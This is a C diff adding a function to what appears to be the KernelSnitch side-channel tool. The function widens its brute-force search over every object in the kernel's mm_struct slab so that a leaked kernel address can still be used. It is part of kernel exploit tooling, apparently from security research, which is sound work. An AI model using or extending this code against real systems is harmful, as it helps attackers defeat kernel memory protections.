@@ -401,6 +401,34 @@ void kernelsnitch_set_search_bounds(
     ks->max_object_index = max_object_index;
     ks->exact_identity_partition = exact_identity_partition;
 }
+
+/**
+ * Re-arm the brute-forcing phase over every object of the mm_struct slab.
+ *
+ * The bounded window above is the fastest and most predictable search, but a
+ * leak that landed on one of the slab's other objects is still a valid leak:
+ * the futex collision set is a property of the leaked mm address, so the same
+ * pass finds exactly that object once the remaining indices are searched.
+ * Widening only re-runs the stateless scan, which costs milliseconds, while
+ * giving up costs a full groom-set rebuild, so callers fall back to this
+ * before they discard a leak.
+ * @arg ks: shared KernelSnitch state of a finished, unsuccessful bruteforce
+ * @return 1 when the state was re-armed, 0 when there is nothing to retry
+ */
+int kernelsnitch_widen_search(struct kernelsnitch_shared_state *ks)
+{
+    size_t objects_per_slab =
+        (KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz;
+    if (ks->state != KERNELSNITCH_MM_NOT_FOUND) {
+        return 0;
+    }
+    ks->min_object_index = 0;
+    ks->max_object_index = objects_per_slab - 1;
+    ks->found = 0;
+    ks->mm_struct = (size_t)-1;
+    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
+    return 1;
+}
 #endif
 
 /**
